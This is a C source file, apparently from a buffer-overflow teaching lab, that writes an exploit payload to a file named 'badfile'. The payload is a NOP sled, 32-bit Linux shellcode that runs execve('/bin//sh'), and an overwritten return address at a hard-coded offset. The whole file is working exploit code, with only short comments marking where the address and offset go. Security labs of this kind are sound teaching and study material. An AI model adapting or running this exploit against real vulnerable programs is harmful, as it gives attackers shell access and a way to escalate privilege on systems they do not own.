#include <stdlib.h>
#include <stdio.h>
#include <string.h>

const char shellcode[] =
	"\x31\xc0"
	"\x50"
	"\x68""//sh"
	"\x68""/bin"
	"\x89\xe3"
	"\x50"
	"\x53"
	"\x89\xe1"
	"\x99"
	"\xb0\x0b"
	"\xcd\x80"
;


int main(int argc, char **argv){
	char buffer[517];
	FILE *badfile;
	long addr;
	long *ptr;
	int offset;

	// Starts by filling the buffer with NOP instructions
	memset(&buffer, 0x90, 517);
	
	// Copies the shellcode near the end of the buffer
	strcpy(buffer + 400, shellcode);
	
	// Enter the new return address here:
	addr = 0x080484ff;
	
	// Enter the offset for the location
	// of the return address here:
	offset = 5;

	ptr = (long *) (buffer + offset);
	*ptr = addr;
	badfile = fopen("./badfile", "w");
	fwrite(buffer, 517, 1, badfile);
	fclose(badfile);
	return 0;
}
